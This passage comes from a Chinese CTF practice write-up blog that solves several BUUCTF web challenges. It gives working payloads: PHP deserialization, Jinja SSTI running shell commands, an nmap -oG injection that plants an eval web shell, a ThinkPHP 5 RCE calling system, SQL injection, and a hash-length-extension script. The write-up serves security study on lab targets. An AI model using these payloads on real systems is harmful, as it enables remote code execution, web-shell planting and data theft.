<span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先传参 <code>text=welcome to the zjctf</code> 这里要注意<code>file_get_contents</code>，不能直接GET传参，要通过伪协议。</p><p>data：text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p><p>input: text=php://input,然后POST <code>welcome to the zjctf</code></p><p><img src="/2020/08/8月刷题记录/image-20200808211240153.png" alt="image-20200808211240153"></p><p>按照提示读取<code>useless.php</code></p><p><img src="/2020/08/8月刷题记录/image-20200808211342281.png" alt="image-20200808211342281"></p><p>useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a= <span class="keyword">new</span> Flag();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200808211534697.png" alt="image-20200808211534697"></p><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="BJDCTF2020]Easy MD5"></a>BJDCTF2020]Easy MD5</h3><p>headers中有提示</p><p><img src="/2020/08/8月刷题记录/image-20200808223026062.png" alt="image-20200808223026062"></p><p>md5($pass,true)的结果是原始的二进制格式字符串，拼接到语句中就可能会造成SQL注入。</p><p>具体参考：<em><a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/" target="_blank" rel="noopener">http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</a></em></p><p>输入密码 <code>ffifdyop</code>，即可登录。</p><p>来到下一关</p><p><img src="/2020/08/8月刷题记录/image-20200808223634396.png" alt="image-20200808223634396"></p><p>直接数组绕过</p><p><code>http://3a0f2829-16ea-4ecd-b023-04ac47f0511a.node3.buuoj.cn/levels91.php?a[]=2&amp;b[]=3</code></p><p>下一关</p><p><img src="/2020/08/8月刷题记录/image-20200808223852953.png" alt="image-20200808223852953"></p><p>还是数组绕过</p><p>或者利用<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">工具</a>碰撞</p><p><img src="/2020/08/8月刷题记录/image-20200808230558650.png" alt="image-20200808230558650"></p><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>随便输个字符串，会直接返回输入的字符串。结果的源码提示了SSTI</p><p><code>1</code>返回1，确实存在SSTI。而且没过滤。</p><p>查看根目录</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(<span class="string">"__import__('os').popen('ls /').read()"</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>接着用上面的读取flag即可</p><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">  $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">  $host = escapeshellarg($host);</span><br><span class="line">  $host = escapeshellcmd($host);</span><br><span class="line">  $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">  @mkdir($sandbox);</span><br><span class="line">  chdir($sandbox);</span><br><span class="line">  <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>escapeshellarg()</code>和 <code>escapeshellcmd(t)</code>同时使用会造成单引号逃逸</p><p>具体参考：<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>传入的参数是：<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>' -v -d a=<span class="number">1</span></span><br><span class="line"><span class="number">2.</span>经过escapeshellarg处理后变成了'<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\'' -v -d a=<span class="number">1</span>'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"><span class="number">3.</span>经过escapeshellcmd处理后变成'<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\'' -v -d a=<span class="number">1</span>\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义</span><br><span class="line"><span class="number">4.</span>最后执行的命令是curl '<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\'' -v -d a=<span class="number">1</span>\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\ -v -d a=<span class="number">1</span>'，即向<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\发起请求，POST 数据为a=<span class="number">1</span>'。</span><br></pre></td></tr></table></figure><p>然后 nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p><p>payload host=<code>&#39; &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG a.php &#39;</code></p><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>WEB-INF/web.xml泄露</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line">/WEB-INF/<span class="class"><span class="keyword">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="class"><span class="keyword">class</span>文件的路径，最后直接下载<span class="title">class</span>文件，在通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure><p>漏洞成因：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。一般情况，jsp引擎默认都是禁止访问WEB<span class="literal">-INF</span>目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB<span class="literal">-INF</span>目录就好了： <span class="keyword">location</span> <span class="title">~ ^/WEB-INF</span>/* &#123; <span class="keyword">deny</span> all; &#125; 或者return <span class="number">404</span>; 或者其他！</span><br></pre></td></tr></table></figure><p>第一个坑，download请求要POST参数，GET无效</p><p>先读取web.xml</p><p><img src="/2020/08/8月刷题记录/image-20200809090311609.png" alt="image-20200809090311609"></p><p>再读取<code>FlagController.class</code></p><p><img src="/2020/08/8月刷题记录/image-20200809090432741.png" alt="image-20200809090432741"></p><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>页面源码有一串字符，先Base32后Base64解码</p><p><code>select * from user where username = &#39;$name&#39;</code></p><p>然后测试下页面逻辑，先判断用户是否存在，不存在就返回<code>wrong user!</code>，存在则接着判断密码，密码错误则返回<code>wrong pass!</code></p><p>大概过滤了这些字符</p><p><img src="/2020/08/8月刷题记录/image-20200809092100640.png" alt="image-20200809092100640"></p><p>直接可以用联合注入，表里有三列</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">Order</span> <span class="title">by</span> <span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>进行用联合注入，回显wrong user!，说明用户不在第一列</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p>尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><p>用户名输入（‘e10adc3949ba59abbe56e057f20f883e’是 123456的md5值）</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'e10adc3949ba59abbe56e057f20f883e'</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h3><p>主页提示ThinkPHP5框架，直接用exp打，报错得到版本信息</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200809100312733.png" alt="image-20200809100312733"></p><p>然后直接用5.0.23exp打</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php?s=captcha</span><br><span class="line">POST: _method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">server</span>[<span class="title">REQUEST_METHOD</span>]=<span class="title">ls</span> -<span class="title">al</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200809100351723.png" alt="image-20200809100351723"></p><h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>在<code>/De1ta</code>路由下</p><p>第一关要绕过waf，不能用 <code>gopher</code>和<code>file</code>协议，但urllib模块支持 <code>local_file</code>协议，而且题目告诉<code>flag</code>在 <code>./flag.txt</code>。</p><p>一般情况下,<code>local_file:flag.txt</code>是相对路径，<code>local_file:///flag.txt</code>则是绝对路径。</p><p>第二关则要绕md5校验</p><p>关键在<code>getSign(self.action, self.param) == self.sign</code>，而<code>getSign()</code> 相当于<code>md5(secert_key + param + action)</code> ，<code>secert_key</code>是脚本随机生成的16位字符串。</p><p>在<code>/geneSign</code>路由下提交<code>param=local_file:flag.txt</code>得到<code>md5(secert_key + local_file:flag.txt + scan)</code>既<code>fefdccdd74fd9e221ea27ca5458d45c7</code></p><p>然后使用 <code>hashpump</code>构造字符串</p><p><img src="/2020/08/8月刷题记录/image-20200809223529285.png" alt="image-20200809223529285"></p><p><img src="/2020/08/8月刷题记录/image-20200809223624980.png" alt="image-20200809223624980"></p><p>因为 <code>param(local_file:flag)</code> 会在服务端拼接，所以<code>action</code>删除要<code>local_file:flag</code>字段</p><p>@一叶飘零师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'local_file:///proc/self/cwd/flag.txt'</span></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://a07ad6bf-0c49-4483-8f5f-9b268185cc87.node3.buuoj.cn/geneSign?param='</span>+url)</span><br><span class="line">old_sign = r.content</span><br><span class="line">new_sign = hashpumpy.hashpump(old_sign, url + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">'sign'</span>: new_sign[<span class="number">0</span>],</span><br><span class="line"><span class="string">'action'</span>: urllib.quote(new_sign[<span class="number">1</span>][len(url):])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://a07ad6bf-0c49-4483-8f5f-9b268185cc87.node3.buuoj.cn/De1ta?param='</span>+url, cookies=cookies)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">1'; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> FlagHere; <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>flag就在表<code>FlagHere</code>中</p><p>过滤如下：</p><p><code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>set被禁，不能用进制绕过</p><p>利用handler绕过，payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'; <span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>啥也没有，最后扫目录</p><p><img src="/2020/08/8月刷题记录/image-20200809235401850.png" alt="image-20200809235401850"></p><p>githack还原文件</p><p><img src="/2020/08/8月刷题记录/image-20200810000328848.png" alt="image-20200810000328848"></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 